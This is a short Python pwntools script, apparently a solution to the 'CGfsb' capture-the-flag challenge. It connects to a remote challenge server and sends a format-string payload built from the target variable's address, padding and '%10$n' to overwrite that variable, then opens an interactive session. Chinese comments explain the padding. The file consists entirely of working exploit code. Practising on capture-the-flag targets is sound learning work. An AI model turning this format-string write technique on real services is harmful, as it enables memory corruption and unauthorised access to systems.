from pwn import *

#r = precess("./CGfsb")
r = remote('61.147.171.105', 59601)

pwnme_addr = 0x0804A068           #pwnme地址在伪代码中双击就能查看哦
payload = p32(pwnme_addr) + b'aaaa' + b'%10$n'     #pwnme的地址需要经过32位编码转换，是四位，而pwnme需要等于8，所以‘aaaa’起着凑字数的作用

r.recvuntil("please tell me your name:\n")
r.sendline('BurYiA')

r.recvuntil("leave your message please:\n")
r.sendline(payload)

r.interactive()
